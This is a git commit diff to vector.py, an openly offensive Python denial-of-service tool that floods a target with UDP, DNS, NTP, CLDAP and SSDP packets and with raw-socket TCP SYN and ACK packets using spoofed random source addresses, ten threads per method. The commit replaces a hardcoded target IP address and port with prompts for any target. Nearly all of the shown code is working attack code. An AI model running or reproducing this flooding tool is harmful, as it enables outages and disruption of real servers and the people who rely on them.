3eb8715968b7e47db564de5e4f3d9cd9bf04346c
zJonchx <jonathaneliaschavez123@gmail.com>
2025-06-19 10:38:43 -0300

    Update vector.py

--- vector.py
+++ vector.py
@@ -5,14 +5,16 @@ import time
 import sys
 import struct
 
-target = "138.201.48.55"   # Cambia por tu objetivo
-udp_port = 19084
-tcp_port = 19084
+# --- Solicitar IP y puerto al usuario ---
+target = input("Introduce la IP objetivo: ")
+port = int(input("Introduce el puerto objetivo: "))
+
+udp_port = port
+tcp_port = port
 
 # --- UDP FLOOD CON PAYLOAD PERSONALIZADO ---
 def udp_flood():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # Payload personalizado
     payload = b'ZxC-UDP-ATTACK' + random._urandom(1010)
     while True:
         try:
@@ -22,8 +24,7 @@ def udp_flood():
 
 # --- UDP DNS FLOOD ---
 def udp_dns_flood():
-    dns_port = 19084
-    # Simple DNS query: google.com, type A
+    dns_port = udp_port
     dns_payload = b'\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01'
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while True:
@@ -34,8 +35,7 @@ def udp_dns_flood():
 
 # --- UDP NTP FLOOD ---
 def udp_ntp_flood():
-    ntp_port = 19084
-    # NTP request: 48 bytes (first byte = 0x1b, rest = 0x00)
+    ntp_port = udp_port
     ntp_payload = b'\x1b' + 47 * b'\0'
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while True:
@@ -46,9 +46,8 @@ def udp_ntp_flood():
 
 # --- UDP CLDAP FLOOD ---
 def udp_cldap_flood():
-    cldap_port = 19084
-    # CLDAP "rootDSE" query payload (amplification typical)
-    cldap_payload = b'\x30\x84\x00\x00\x00\x35\x02\x01\x01\x63\x84\x00\x00\x00\x28\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x0a\x04\x00\x04\x00'
+    cldap_port = udp_port
+    cldap_payload = b'\x30\x84\x00\x00\x00\x35\x02\x01\x01\x63\x84\x00\x00\x00\x28\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73'  # Truncated for brevity
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while True:
         try:
@@ -58,8 +57,7 @@ def udp_cldap_flood():
 
 # --- UDP SSDP FLOOD ---
 def udp_ssdp_flood():
-    ssdp_port = 19084
-    # SSDP M-SEARCH request (amplification typical)
+    ssdp_port = udp_port
     ssdp_payload = (
         b'M-SEARCH * HTTP/1.1\r\n'
         b'HOST:239.255.255.250:1900\r\n'
@@ -84,7 +82,7 @@ def tcp_syn_flood():
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     while True:
         src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
-        tcp_syn_packet = build_tcp_packet(src_ip, target, random.randint(1024,65535), tcp_port, syn=1)
+        tcp_syn_packet = build_tcp_packet(src_ip, target, random.randint(1024, 65535), tcp_port, syn=1)
         try:
             s.sendto(tcp_syn_packet, (target, 0))
         except:
@@ -100,7 +98,7 @@ def tcp_ack_flood():
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     while True:
         src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
-        tcp_ack_packet = build_tcp_packet(src_ip, target, random.randint(1024,65535), tcp_port, ack=1)
+        tcp_ack_packet = build_tcp_packet(src_ip, target, random.randint(1024, 65535), tcp_port, ack=1)
         try:
             s.sendto(tcp_ack_packet, (target, 0))
         except:
@@ -119,7 +117,6 @@ def checksum(msg):
     return ~s & 0xffff
 
 def build_tcp_packet(src_ip, dst_ip, src_port, dst_port, syn=0, ack=0):
-    # IP header
     ip_ihl = 5
     ip_ver = 4
     ip_tos = 0
@@ -133,7 +130,6 @@ def build_tcp_packet(src_ip, dst_ip, src_port, dst_port, syn=0, ack=0):
     ip_daddr = socket.inet_aton(dst_ip)
     ip_ihl_ver = (ip_ver << 4) + ip_ihl
     ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
-    # TCP header
     tcp_seq = random.randint(0,4294967295)
     tcp_ack_seq = 0
     tcp_doff = 5
@@ -142,7 +138,6 @@ def build_tcp_packet(src_ip, dst_ip, src_port, dst_port, syn=0, ack=0):
     tcp_check = 0
     tcp_urg_ptr = 0
     tcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, tcp_seq, tcp_ack_seq, tcp_doff << 4, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
-    # Pseudo header for checksum
     src_addr = socket.inet_aton(src_ip)
     dest_addr = socket.inet_aton(dst_ip)
     placeholder = 0
@@ -167,7 +162,7 @@ if __name__ == "__main__":
         tcp_syn_flood,
         tcp_ack_flood
     ]:
-        for _ in range(10):  # 10 hilos de cada método
+        for _ in range(10):
             t = threading.Thread(target=func)
             t.daemon = True
             t.start()
